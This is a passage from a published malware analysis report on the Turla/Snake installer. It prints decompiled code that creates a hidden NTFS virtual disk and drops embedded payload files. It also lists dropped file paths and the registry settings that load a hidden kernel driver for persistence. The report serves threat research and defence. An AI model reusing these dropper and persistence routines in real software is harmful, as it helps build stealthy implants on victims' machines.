@@ -1,0 +1,116 @@
+Analysis - Installer
+Sample A can be considered an installer or dropper. It drops files into the system and initializes the environment for
+production. First, it probes if a virtual disk
+\DEVICE\IdeDrive1\
+is present on the system. If not, the virtual disk is being created with file system NTFS, using FormatEx from
+Microsofts fmifs.dll .
+1 int __cdecl create_virtual_disk()
+2{
+3 HMODULE hModule_fmifs.dll;
+4 int result;
+5 FARPROC FormatEx;
+6 WCHAR VirtualDisk;
+7
+8 result = 0;
+9 hModule_fmifs.dll = LoadLibraryA("fmifs.dll");
+10 if ( hModule_fmifs.dll )
+11 {
+12 FormatEx = GetProcAddress(hModule_fmifs.dll, "FormatEx");
+13 if ( FormatEx )
+14 {
+15 wsprintfW(&VirtualDisk, L"%S", "\\.\IdeDrive1\\");
+16 (FormatEx)(&VirtualDisk, FMIFS_HARDDISK, L"NTFS", &gVirtualDiskName, 1, 0, FormatExCallback);
+17 result = gFormatExCallbackActionInfo != 0;
+18 }
+19 FreeLibrary(hModule_fmifs.dll);
+20 }
+21 else
+22 {
+23 result = 0;
+24 }
+25 return result;
+26}
+4 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+The presence of the malware’s configuration file is tested:
+\DEVICE\IdeDrive1\config.txt
+If not found, it is dropped from the resource section 0x88d90 .
+The following files are dropped depending on whether Windows is running in 32 bit or 64 bit.
+%SystemRoot%\$NtUninstallQ722833$\usbdev.sys (hidden)
+\DEVICE\IdeDrive1\inetpub.dll
+\DEVICE\IdeDrive1\cryptoapi.dll
+Independently from the architecture, the file names of the dropped files are the same, but a specific version of the
+file is dropped according to the operating system architecture.
+This is achieved by a logic similar to the following one. This is done for all files except the configuration file.
+1 if ( IsWow64 )
+2 {
+3 res = create_from_resources("#162", "\\.\IdeDrive1\inetpub.dll");
+4 if ( last_error )
+5 {
+6 error = GetLastError();
+7 log(last_error, "ef1... %d, %d\n", res, error);
+8 }
+9 v29 = create_from_resources("#165", "\\.\IdeDrive1\cryptoapi.dll");
+10 }
+The function create_from_resources() looks like:
+1 int __cdecl create_from_resources(LPCSTR NameOfResource, LPCSTR lpSrc)
+2{
+3 HRSRC HRSRC;
+4 HGLOBAL hGlobal;
+5 DWORD SizeOfResource;
+6 HANDLE hFile;
+7 DWORD error;
+8 CHAR lpFileName;
+9 char pSecurityDescriptor;
+10 DWORD NumberOfBytesWritten;
+11 LPCVOID lpBuffer;
+12
+13 ExpandEnvironmentStringsA(lpSrc, &lpFileName, 0x104u);
+14 HRSRC = FindResourceA(0, NameOfResource, "BINARY");
+15 if ( !HRSRC )
+16 return 0;
+17 hGlobal = LoadResource(0, HRSRC);
+18 if ( !hGlobal )
+19 return 0;
+20 lpBuffer = LockResource(hGlobal);
+21 if ( !lpBuffer )
+22 return 0;
+23 SizeOfResource = SizeofResource(0, HRSRC);
+24 hFile = CreateFileA(&lpFileName, GENERIC_WRITE, 0, 0, 2u, 0x80u, 0);
+25 if ( hFile == -1 )
+26 {
+27 if ( last_error )
+28 {
+29 error = GetLastError();
+30 log(last_error, "ex_fail... %d\n", error);
+31 }
+32 return 0;
+33 }
+34 WriteFile(hFile, lpBuffer, SizeOfResource, &NumberOfBytesWritten, 0);
+35 CloseHandle(hFile);
+36 if ( !InitializeSecurityDescriptor(&pSecurityDescriptor, 1u) )
+37 return 0;
+38 return SetFileSecurityA(&lpFileName, DACL_SECURITY_INFORMATION, &pSecurityDescriptor) != 0;
+39}
+Subsequently, after dropping the correct files, the malware makes itself persistent on the system and creates a
+service with the following parameters, which loads the file usbdev.sys as a kernel driver:
+In:      HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services:
+Key:     usblink
+Type:     1 (SERVICE_KERNEL_DRIVER)
+5 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+Start: 1 (SERVICE_SYSTEM_START)
+ErrorControl: 0 (SERVICE_ERROR_IGNORE)
+Group:    Streams Drivers
+DisplayName: usblink
+ImagePath:  \SystemRoot\$NtUninstallQ722833$\usbdev.sys
+If during installation anything goes wrong, the registry keys are deleted. The files however are not.
+During the installation process, extensive logging is ensuring good visibility on potential installation problems. The
+attacker uses english language for the logging, although he is lacking attention to detail when it comes to correct
+usage of the language, as the following examples demonstrate:
+win32 detect... (should be simple past)
+x64 detect... (should be simple past)
+CretaFileA(%s): (should be CreateFileA)
+Can`t open SERVICES key (that shouldn't be a backtick)
+Language deficits are also demonstrated in other files of this collection. We show them in a separate chapter.
+A list of dropped files is given in the next chapter.
